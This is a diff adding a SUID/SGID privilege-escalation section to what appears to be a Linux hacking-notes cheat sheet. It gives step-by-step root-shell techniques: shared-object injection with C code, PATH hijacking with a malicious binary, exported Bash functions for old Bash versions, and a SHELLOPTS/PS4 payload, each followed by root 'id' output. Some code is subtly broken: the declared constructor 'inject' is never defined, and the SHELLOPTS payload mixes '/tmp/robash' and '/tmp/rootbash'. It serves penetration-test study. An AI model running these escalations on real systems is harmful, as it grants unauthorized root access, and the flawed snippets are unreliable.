@@ -380,6 +380,264 @@ find \-type f 2>/dev/null | grep "config" | xargs grep -i -E "username|password|
 
 ## Sticky Bits and SUID/SGID 
 
+### Known Exploits
+
+SUID files are used by several programs to facilitate their operation. These SUID files, run as root, and can contain vulnerabilities that we can exploit for a root shell. 
+
+#### Known Exploits Privilege Escalation
+
+1. Find SUID/SGID files on the target:
+
+   ```text
+   $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+   ```
+
+2. Find the version of the binary:
+
+   ```text
+   program -v
+   program --version
+   ```
+
+3. Using searchsploit on our localhost, we can try to find local privilege escalation for the program:
+
+   ```text
+   searchsploit <program>
+   ```
+
+4. Make sure the script is executable:
+
+   ```text
+   chmod +x exploit.sh
+   ```
+
+5. Execute the script to gain a root shell:
+
+   ```text
+   $ ./privesc.sh
+   # id
+   uid=0(root) gid=1000(user) groups=0(root)
+   ```
+
+### Shared Object Injection
+
+When a program is run, it tries to load the shared objects it needs. We may use strace to monitor these system calls and see if any shared objects are missing. We can build a shared object and start a root shell when the program is loaded if we can write to the location the program wants to open.
+
+#### Shared Object Injection Privilege Escalation
+
+1. Enumerate SUID/SGID files on the target:
+
+   ```text
+   $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+   ```
+
+2. Run strace on the SUID file:
+
+   ```text
+   $ strace /usr/local/bin/binary_name 2>&1 | grep -iE "open|access|no such file"
+   ```
+
+3. Create the necessary file `<required_name.c>` with the following code:
+
+   ```text
+   #include <stdio.h>
+   #include <stdlib.h>
+
+   static void inject() __attribute__((constructor));
+
+   void exec_bash() {
+   	setuid(0);
+   	system("/bin/bash -p");
+   }
+   ```
+
+4. Compile the `.so` file:
+
+   ```text
+   gcc -shared -fPIC -o filname.so filename.c
+   ```
+
+5. Run the SUID executable to get a root shell:
+
+   ```text
+   $ /usr/local/bin/suid-so
+   # id
+   uid=0(root) gid=1000(user) ...
+   ```
+
+### PATH Environment Variable
+
+A list of directories where the shell should look for applications is stored in the PATH environment variable. If a program attempts to run another program but only specifies the program name rather than the absolute path, the shell will look through the PATH directories until it finds it. We can tell the shell to hunt for programs in a directory we can write to first because a user has complete control over their PATH variable.
+
+#### Finding Vulnerable Programs
+
+If software tries to run another program, the name of that application is almost certainly stored as a string in the executable file. We can perform inspect the binaries. 
+
+{% embed url="https://wixnic.gitbook.io/hacknotes/reversing/inspecting-binaries" %}
+
+Running strings against a file:
+
+```text
+strings /path/to/file
+```
+
+Running strace against a command:
+
+```text
+strace -v -f -e execve <command> 2>&1 | grep exec
+```
+
+Running ltrace against a command:
+
+```text
+ltrace <command>
+```
+
+#### Finding SUID/SGID Vulnerable Privilege Escalation
+
+1. Enumerate SUID/SGID files on the target:
+
+   ```text
+   find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+   ```
+
+2. Enumerate the strings on the SUID file:
+
+   ```text
+   strings /usr/local/bin/binary
+   ```
+
+3. We can verify if it executes a service or file with strace:
+
+   ```text
+   strace -v -f -e execve /usr/local/bin/binary 2>&1 | grep service
+   ```
+
+4. Alternatively, we can also verify with ltrace:
+
+   ```text
+   ltrace /usr/local/bin/binary 2>&1
+   ```
+
+5. Create a file named service.c with the following contents:
+
+   ```text
+   int main() {
+    setuid(0);
+    system("/bin/bash -p");
+   }
+   ```
+
+6. Compile service.c into a file called service:
+
+   ```text
+   gcc -o service service.c
+   ```
+
+7. Prepend the current directory to the `$PATH` environment variable, and execute the SUID file to execute a root shell:
+
+   ```text
+   PATH=.:$PATH /usr/local/bin/binary
+   root@victim:~# id
+   uid=0(root) gid=0(root) groups=0(root) ...
+   ```
+
+### Bash &lt;4.2-048
+
+It is possible to define user functions with an absolute pathname.
+
+#### Bash &lt;4.2-048 Privilege Escalation
+
+1. Enumerate SUID/SGID files on the target:
+
+   ```text
+   find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+   ```
+
+2. Enumerate the programs that binary runs with strings:
+
+   ```text
+   strings /usr/local/bin/binary_name
+   ```
+
+3. We can verify which program is calling with strace:
+
+   ```text
+   strace -v -f -e execve /usr/local/bin/binary_name 2>&1
+   ```
+
+4. Alternatively, we can also verify with ltrace:
+
+   ```text
+   ltrace /usr/local/bin/binary_name 2>&1 
+   ```
+
+5. Verify the version of Bash is lower than 4.2-048:
+
+   ```text
+   $ bash --version
+   GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+   ```
+
+6. Create a Bash function with the name “/usr/sbin/serviceCalled” \(change this to the actual name of the program being called\) and export the function:
+
+   ```text
+   function /usr/sbin/serviceCalled { /bin/bash -p; }
+   export –f /usr/sbin/serviceCalled
+   ```
+
+7. Execute the SUID file for a root shell:
+
+   ```text
+   $ /usr/local/bin/binary_name
+   root@victim:~# id
+   uid=0(root) gid=0(root) groups=0(root) ...
+   ```
+
+### SHELLOPTS
+
+.
+
+#### SHELLOPTS Privilege Escalation
+
+1. Enumerate SUID/SGID files on the target:
+
+   ```text
+   find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+   ```
+
+2. Enumerate strings on the SUID file:
+
+   ```text
+   strings /usr/local/bin/binary_name
+   ```
+
+3. The binary may be trying to include a file, we can verify this with strace:
+
+   ```text
+   strace -v -f -e execve /usr/local/bin/binary_name 2>&1
+   ```
+
+4. Alternatively, we can also verify with ltrace:
+
+   ```text
+   ltrace /usr/local/bin/binary_name 2>&1
+   ```
+
+5. Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
+
+   ```text
+   env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/robash; chown root /tmp/rootbash; chmod +s /tmp/robash)' /usr/local/bin/binary_name
+   ```
+
+6. Run the robash with the -p option to get a root shell:
+
+   ```text
+   /tmp/robash -p
+   rootbash-4.1# id
+   uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) ...
+   ```
+
 ### Sticky Bits and SUID/SGID Enumeration
 
 ```bash
